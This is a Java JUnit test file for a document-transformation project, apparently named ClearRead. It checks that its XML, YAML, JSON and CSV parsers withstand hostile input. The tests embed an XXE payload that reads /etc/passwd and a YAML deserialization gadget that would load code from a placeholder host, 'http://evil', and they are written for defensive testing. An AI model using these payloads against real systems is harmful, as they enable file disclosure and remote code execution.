package com.clearread.transform;

import com.clearread.config.ClearReadProperties;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.json.JsonMapper;

import java.nio.charset.StandardCharsets;
import java.util.UUID;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class SecurityAdaptersTest {

    private final ClearReadProperties props = new ClearReadProperties();
    private final JsonMapper mapper = JsonMapper.builder().build();

    @Test
    void xmlRejectsDoctypeXxe() {
        XmlAdapter adapter = new XmlAdapter(props);
        String xxe = """
                <?xml version="1.0"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <root>&xxe;</root>
                """;
        var doc = adapter.parse(UUID.randomUUID(), UUID.randomUUID(), UUID.randomUUID(),
                "xxe", "evil.xml", "abc", xxe.getBytes(StandardCharsets.UTF_8));
        assertTrue(doc.warnings().stream().anyMatch(w -> "XML_PARSE".equals(w.code())));
        String joined = String.valueOf(doc.body());
        assertFalse(joined.contains("root:"));
    }

    @Test
    void yamlSafeRejectsUnsafeTags() {
        YamlAdapter adapter = new YamlAdapter(mapper, props);
        String evil = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil\"]]]]\n";
        var doc = adapter.parse(UUID.randomUUID(), UUID.randomUUID(), UUID.randomUUID(),
                "y", "evil.yaml", "abc", evil.getBytes(StandardCharsets.UTF_8));
        // SafeConstructor should not instantiate; either warning or plain string/map failure path
        assertTrue(doc.warnings().stream().anyMatch(w -> "YAML_PARSE".equals(w.code()))
                || doc.body().stream().anyMatch(n -> "treeNode".equals(n.get("type")) || "formattedSource".equals(n.get("type"))));
    }

    @Test
    void jsonRejectsDeepNesting() {
        props.getLimits().setMaxNestingDepth(8);
        JsonAdapter adapter = new JsonAdapter(mapper, props);
        String deep = "[".repeat(40) + "1" + "]".repeat(40);
        assertThrows(NestingGuard.TooDeep.class, () ->
                adapter.parse(UUID.randomUUID(), UUID.randomUUID(), UUID.randomUUID(),
                        "d", "deep.json", "abc", deep.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void csvParsesQuotedMultiline() {
        String csv = "name,note\n\"Ada\",\"line1\nline2\"\n";
        var rows = CsvAdapter.parseCsv(csv, ',');
        assertTrue(rows.size() >= 2);
        assertTrue(rows.get(1).get(1).contains("line1"));
    }
}
